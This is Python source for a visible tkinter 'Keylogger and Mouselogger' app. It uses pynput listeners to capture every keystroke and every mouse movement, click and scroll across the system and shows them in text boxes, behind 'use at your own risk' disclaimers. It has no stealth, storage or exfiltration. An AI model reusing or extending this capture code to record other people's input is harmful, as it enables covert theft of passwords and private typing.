# USE AT YOUR OWN RISK
# WITH GREAT POWER COMES GREAT RESPONSIBILITY
# I AM NOT RESPONSIBLE FOR WHAT YOU DO WITH THIS
""" Created by: AK1R4S4T0H
"""
import tkinter as tk
from tkinter import ttk, scrolledtext
from pynput import keyboard, mouse

class KeyloggerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Keylogger and Mouselogger")
        self.root.geometry("600x720")
        self.root.configure(bg="#292929")
        self.style = ttk.Style()
        self.style.theme_use('clam')
        self.style.configure('TLabel', foreground='white', background='#292929')
        self.style.configure('TButton', foreground='white', background='#494949', bordercolor="red", borderwidth=2, relief="sunken")
        self.style.map('TButton', foreground=[("hover", "red")], background=[("hover", "#696969")])

        self.label = ttk.Label(self.root, text="KEYS")
        self.label.grid(row=0, column=1, pady=5, padx=1)

        self.textbox = scrolledtext.ScrolledText(self.root, wrap=tk.WORD, height=15, width=55, bg="#494949", fg="white")
        self.textbox.grid(row=1, column=1, pady=5)

        self.start_button = ttk.Button(self.root, text="Start", command=self.start_keylogger)
        self.start_button.grid(row=4, column=0, pady=5, padx=1)

        self.stop_button = ttk.Button(self.root, text="Stop", command=self.stop_keylogger)
        self.stop_button.grid(row=4, column=2, pady=5, padx=1)

        self.clear_button = ttk.Button(self.root, text="Clear", command=self.clear_text)
        self.clear_button.grid(row=4, column=1, pady=5, padx=1)

        self.label2 = ttk.Label(self.root, text="MOUSE")
        self.label2.grid(row=2, column=1, pady=10)

        self.textbox2 = scrolledtext.ScrolledText(self.root, wrap=tk.WORD, height=15, width=55, bg="#494949", fg="white")
        self.textbox2.grid(row=3, column=1, pady=5)

        self.listener = None
        self.listener2 = None

    def on_press(self, key):
        char = None
        try:
            char = key.char
        except AttributeError:
            if key == keyboard.Key.space:
                char = "[SPACE]"
            elif key == keyboard.Key.enter:
                char = "[ENTER]"
            else:
                char = f" [{key}] "

        if char:
            self.textbox.insert(tk.END, char)

    def on_move(self, x, y):
        self.textbox2.insert(tk.END, f"Mouse moved to ({x}, {y})\n")
        self.textbox2.see(tk.END)

    def on_click(self, x, y, button, pressed):
        if pressed:
            self.textbox2.insert(tk.END, f"Mouse clicked at ({x}, {y}) with {button.name}\n")
            self.textbox2.see(tk.END)

    def on_scroll(self, x, y, dx, dy):
        if dy > 0:
            self.textbox2.insert(tk.END, "Mouse scrolled up\n")
        elif dy < 0:
            self.textbox2.insert(tk.END, "Mouse scrolled down\n")
        self.textbox2.see(tk.END)

    def start_keylogger(self):
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()
        self.listener2 = mouse.Listener(on_move=self.on_move, on_click=self.on_click, on_scroll=self.on_scroll)
        self.listener2.start()
        self.start_button.config(state="disabled")
        self.stop_button.config(state="normal")

    def stop_keylogger(self):
        if self.listener and self.listener2:
            self.listener.stop()
            self.listener2.stop()
        self.start_button.config(state="normal")
        self.stop_button.config(state="disabled")

    def clear_text(self):
        self.textbox.delete("1.0", tk.END)
        self.textbox2.delete("1.0", tk.END)

if __name__ == "__main__":
    root = tk.Tk()
    keylogger_gui = KeyloggerGUI(root)
    root.mainloop()
